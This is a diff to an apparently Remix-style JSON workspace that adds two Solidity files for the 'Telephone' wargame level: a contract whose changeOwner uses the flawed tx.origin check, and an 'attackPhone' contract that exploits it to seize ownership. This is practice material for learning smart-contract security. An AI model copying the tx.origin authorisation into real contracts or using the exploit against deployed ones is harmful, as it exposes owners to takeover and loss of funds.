@@ -59,5 +59,21 @@
         "file": "exersice.sol"
       }
     }
+  },
+  "tele.sol": {
+    "__sources__": {
+      "tele.sol": {
+        "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n\n\ncontract Telephone {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function changeOwner(address _owner) public {\n        if (tx.origin != msg.sender) {\n            owner = _owner;\n        }\n    }\n}\n",
+        "file": "tele.sol"
+      }
+    }
+  },
+  "telephone.sol": {
+    "__sources__": {
+      "telephone.sol": {
+        "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Telephone {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function changeOwner(address _owner) public {\n        if (tx.origin != msg.sender) {\n            owner = _owner;\n        }\n    \n\n    }\n\n}\n\ncontract attackPhone{\n\n\n\n\n    function attack(address _phone) public{\n        Telephone(_phone).changeOwner(address(this));\n    }\n}",
+        "file": "telephone.sol"
+      }
+    }
   }
 }
